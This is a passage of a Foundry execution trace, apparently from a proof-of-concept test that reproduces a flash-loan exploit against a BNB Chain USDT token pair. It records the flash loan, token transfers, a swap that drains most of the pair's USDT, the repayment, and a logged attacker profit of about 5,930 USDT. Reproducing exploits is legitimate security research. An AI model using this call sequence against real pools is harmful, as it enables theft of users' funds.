    │   │   │   ├─ [397] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::token1() [staticcall]
    │   │   │   │   └─ ← [Return] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6
    │   │   │   ├─ [893] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 164733284422772331215936 [1.647e23], 27215302114196146316 [2.721e19], 1669726874 [1.669e9]
    │   │   │   ├─ [598] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   └─ ← [Return] 27215302114196146316 [2.721e19]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   └─ ← [Return] 164733284422772331216937 [1.647e23]
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 2947649248379557664 [2.947e18])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, value: 5895298496759115328 [5.895e18])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAA37693d4f6A29272B94fe7476863bDE5c6e9769, value: 1473824624189778830 [1.473e18])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, value: 284448152468627314190 [2.844e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 164733284422772331215936 [1.647e23], 27215302114196146316 [2.721e19], 1669726874 [1.669e9]
    │   │   ├─ [598] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   └─ ← [Return] 311663454582823460506 [3.116e20]
    │   │   ├─ [5151] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(284448152468627314190 [2.844e20], [0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, 0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   │   ├─ [893] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 164733284422772331215936 [1.647e23], 27215302114196146316 [2.721e19], 1669726874 [1.669e9]
    │   │   │   └─ ← [Return] [284448152468627314190 [2.844e20], 150315428016130395876159 [1.503e23]]
    │   │   ├─ [18425] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::swap(150315428016130395876159 [1.503e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 150315428016130395876159 [1.503e23])
    │   │   │   │   ├─ emit Transfer(from: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 150315428016130395876159 [1.503e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   └─ ← [Return] 14417856406641935340778 [1.441e22]
    │   │   │   ├─ [598] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   └─ ← [Return] 311663454582823460506 [3.116e20]
    │   │   │   ├─ emit Sync(reserve0: 14417856406641935340778 [1.441e22], reserve1: 311663454582823460506 [3.116e20])
    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 1001, amount1In: 284448152468627314190 [2.844e20], amount0Out: 150315428016130395876159 [1.503e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, 794994271783747229185351 [7.949e23])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, value: 794994271783747229185351 [7.949e23])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [2531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 41478384743744576047 [4.147e19]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 794994271783747229185351 [7.949e23]
    │   ├─ [531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 41478384743744576047 [4.147e19]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 794994271783747229185351 [7.949e23]
    │   ├─ emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 794994271783747229185351 [7.949e23])
    │   └─ ← [Stop] 
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 5930678886576313268612 [5.93e21]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance after exploit", val: 5930678886576313268612 [5.93e21], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.34s (1.04s CPU time)

Ran 2 test suites in 1.34s (1.60s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
